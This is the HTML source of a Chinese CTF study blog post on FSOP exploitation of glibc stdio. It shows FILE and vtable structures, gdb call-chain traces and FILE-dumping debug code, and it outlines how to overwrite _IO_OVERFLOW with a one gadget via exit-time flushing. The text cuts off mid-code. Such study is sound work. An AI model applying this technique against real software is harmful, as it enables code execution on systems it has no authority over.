@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="FSOP学习由于刷how2heap时碰到了一题zerostorage，这个题在ubuntu14上由于存在一个offset2lib的攻击，所以在泄露libc地址之后可以get到程序的地址，但是我复现这个题是在ubuntu16下面做的，所以这个攻击方法无效XD，得另寻他路，所以我找到了raycp师傅的这篇文章，上面提到了FSOP这个攻击姿势，理所当然我当然要啃一啃了，顺带借助了一下CTFwiki和师傅">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FSOP&amp;the_end">
+<meta property="og:url" content="http://yoursite.com/2020/02/25/FSOP-the-end/index.html">
+<meta property="og:site_name" content="Coldshiel&#39;s blog">
+<meta property="og:description" content="FSOP学习由于刷how2heap时碰到了一题zerostorage，这个题在ubuntu14上由于存在一个offset2lib的攻击，所以在泄露libc地址之后可以get到程序的地址，但是我复现这个题是在ubuntu16下面做的，所以这个攻击方法无效XD，得另寻他路，所以我找到了raycp师傅的这篇文章，上面提到了FSOP这个攻击姿势，理所当然我当然要啃一啃了，顺带借助了一下CTFwiki和师傅">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/02/25/FSOP-the-end/1582612886398.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/25/FSOP-the-end/1582618757197.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/25/FSOP-the-end/1582615573201.png">
+<meta property="article:published_time" content="2020-02-26T06:00:08.000Z">
+<meta property="article:modified_time" content="2020-02-29T10:07:09.515Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/25/FSOP-the-end/1582612886398.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/02/25/FSOP-the-end/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>FSOP&the_end | Coldshiel's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Coldshiel's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/FSOP-the-end/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coldshiel's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          FSOP&the_end
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-02-25 22:00:08" itemprop="dateCreated datePublished" datetime="2020-02-25T22:00:08-08:00">2020-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-02-29 02:07:09" itemprop="dateModified" datetime="2020-02-29T02:07:09-08:00">2020-02-29</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="FSOP学习"><a href="#FSOP学习" class="headerlink" title="FSOP学习"></a>FSOP学习</h1><p>由于刷how2heap时碰到了一题zerostorage，这个题在ubuntu14上由于存在一个<a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank" rel="noopener">offset2lib</a>的攻击，所以在泄露libc地址之后可以get到程序的地址，但是我复现这个题是在ubuntu16下面做的，所以这个攻击方法无效XD，得另寻他路，所以我找到了raycp师傅的<a href="https://www.anquanke.com/post/id/178418" target="_blank" rel="noopener">这篇文章</a>，上面提到了FSOP这个攻击姿势，理所当然我当然要啃一啃了，顺带借助了一下<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop-zh/" target="_blank" rel="noopener">CTFwiki</a>和师傅的另一篇<a href="https://ray-cp.github.io/archivers/HCTF-2018-PWN-writeup" target="_blank" rel="noopener">博客</a></p>
+<h1 id="FILE"><a href="#FILE" class="headerlink" title="FILE *"></a>FILE *</h1><p>首先来看一下FILE这个结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;<span class="comment">//fd</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="IO-FILE-plus-amp-IO-jump-t"><a href="#IO-FILE-plus-amp-IO-jump-t" class="headerlink" title="_IO_FILE_plus&amp;_IO_jump_t"></a>_IO_FILE_plus&amp;_IO_jump_t</h1><p>还有FILE结构体的封装和vtable，当然最最主要的就是这个指针和这个table了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h1><p>table中对应函数的调用姿势会尝试着慢慢更新的，现在菜鸡学到的有这几种：</p>
+<ol>
+<li><p>利用的是在程序调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，调用 <code>_IO_2_1_stdout_</code> 下的 <code>vatable</code> 中 <code>_setbuf</code> 函数（wiki）</p>
+</li>
+<li><p>puts 在源码中实现的函数是<code>_IO_puts</code>，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的<code>_IO_sputn</code>，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。（wiki）</p>
+</li>
+<li><p>printf 调用栈（wiki）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure>
+
+<p>自己试出来的几种，有些不同都是得自己去看源码啊（跪)，好像和上面比起来没有看到那个overflow：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">► f 0     7ffff7b042b0 write（没有setbuf，输出结尾有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 3     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 4     7ffff7a8647d _IO_file_xsputn+669</span><br><span class="line">  f 5     7ffff7a5a92d vfprintf+1981</span><br><span class="line">  f 6     7ffff7a62899 printf+153</span><br><span class="line">  f 7           40053e main+24</span><br><span class="line">  </span><br><span class="line">► f 0     7ffff7b042b0 write()（setbuf(stdout,0)，输出结尾有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 3     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 4     7ffff7a5cf94 buffered_vfprintf+308</span><br><span class="line">  f 5     7ffff7a5a32d vfprintf+445</span><br><span class="line">  f 6     7ffff7a62899 printf+153</span><br><span class="line">  f 7           4005e2 main+44</span><br><span class="line">  </span><br><span class="line">► f 0     7ffff7b042b0 write（没有setbuf，输出结尾没有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 3     7ffff7a87409 _IO_do_write+121</span><br><span class="line">  f 4     7ffff7a89196 _IO_flush_all_lockp+374</span><br><span class="line">  f 5     7ffff7a8932a _IO_cleanup+26</span><br><span class="line">  f 6     7ffff7a46f9b __run_exit_handlers+139</span><br><span class="line">  f 7     7ffff7a47045</span><br><span class="line">  f 8     7ffff7a2d837 __libc_start_main+247</span><br><span class="line">  </span><br><span class="line">► f 0     7ffff7b042b0 write（setbuf(stdout,0)，输出结尾没有换行）</span><br><span class="line">  f 1     7ffff7a85bff _IO_file_write+143</span><br><span class="line">  f 2     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 3     7ffff7a8638a _IO_file_xsputn+426</span><br><span class="line">  f 4     7ffff7a5cf94 buffered_vfprintf+308</span><br><span class="line">  f 5     7ffff7a5a32d vfprintf+445</span><br><span class="line">  f 6     7ffff7a62899 printf+153</span><br><span class="line">  f 7           4005e2 main+44</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp</code><br>控制<code>stdin</code>、<code>stdout</code>或者<code>stderr</code>中实现<code>fp-&gt;_mode &lt;= 0</code>以及<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>同时修改vtable里面的<code>_IO_OVERFLOW</code>为one gadget（来自raycp师傅的博客）</p>
+</li>
+<li><p>程序结束时在<code>_dl_fini_</code>中调用<code>_rtld_global</code>结构体的<code>__rtld_lock_lock_recursive</code>（来自raycp师傅的博客），准确来说这个不算FILE里面的，不过还是写一下记一下比较好</p>
+</li>
+</ol>
+<h1 id="自己的调试代码"><a href="#自己的调试代码" class="headerlink" title="自己的调试代码"></a>自己的调试代码</h1><p>调试之前写了一个有0x40个a的test.txt（用python -c写进去的，因为无论用vim还是gedit好像都会在保存时自动加一个换行符，比较搞，用<code>cat test.txt|hd</code>就可以看到结尾是不是有换行符）</p>
+<p>然后用下面的代码调试了一下…调试细节先放着，这个是帮我用来探索前面几个指针是怎么用的，还有很多细节其实都不太清楚，以后玩源码的时候再来看（结果写题的时候就发现直接用gdb p一下那个符号好像更明确….我佛了，不行就加上(_IO_FILE_plus *)转换一下地址的类型，这样看来代码写的好像多余了2333333）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printFILE</span><span class="params">(FILE * tmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_flags:%#x\n"</span>,*(<span class="keyword">int</span>*)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_flags)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_read_ptr:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_read_ptr)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_read_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_read_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_read_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_read_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_write_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_write_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_write_ptr:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_write_ptr)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_write_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_write_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_buf_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_buf_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_buf_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_buf_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_save_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_save_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_backup_base:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_backup_base)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_IO_save_end:%p\n"</span>,*(<span class="keyword">char</span>**)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_IO_save_end)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_markers:%p\n"</span>,*(struct _IO_marker **)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_markers)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_chain:%p\n"</span>,*(struct _IO_FILE **)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_chain)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_fileno:%#x\n"</span>,*(<span class="keyword">int</span>*)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_fileno)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_flags2:%#x\n"</span>,*(<span class="keyword">int</span>*)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_flags2)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_old_offset:%#x\n"</span>,*(_IO_off_t *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_old_offset)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_cur_column:%#x\n"</span>,*(<span class="keyword">unsigned</span> short *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_cur_column)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_vtable_offset:%#x\n"</span>,*(<span class="keyword">signed</span> <span class="keyword">char</span> *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_vtable_offset)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_shortbuf:%#x\n"</span>,*(<span class="keyword">char</span> *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+offsetof(_IO_FILE,_shortbuf)));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"_lock:%#x\n\n"</span>,*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(_IO_lock_t *)((<span class="keyword">unsigned</span> <span 